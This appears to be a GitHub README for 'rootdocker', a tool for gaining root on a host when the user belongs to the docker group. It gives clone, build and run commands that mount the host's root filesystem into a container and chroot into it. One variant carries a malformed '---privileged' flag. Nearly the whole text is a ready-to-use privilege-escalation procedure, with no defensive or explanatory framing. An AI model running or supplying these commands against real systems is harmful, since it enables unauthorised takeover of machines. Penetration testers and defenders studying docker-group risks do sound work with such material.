# rootdocker
Become a root on host using docker if the user in group "docker"<br />
Basically this container will mount the host inside the container and then chroot the mounted directory <br />

###### How to use:
`git clone https://github.com/Hamza-Megahed/rootdocker.git`<br />
`cd rootdocker`<br />
`docker build -t rootdocker .`<br />
`docker run -v /:/host -i -t rootdocker`<br />
or <br />
`docker run ---privileged -v /:/host -i -t rootdocker`<br />
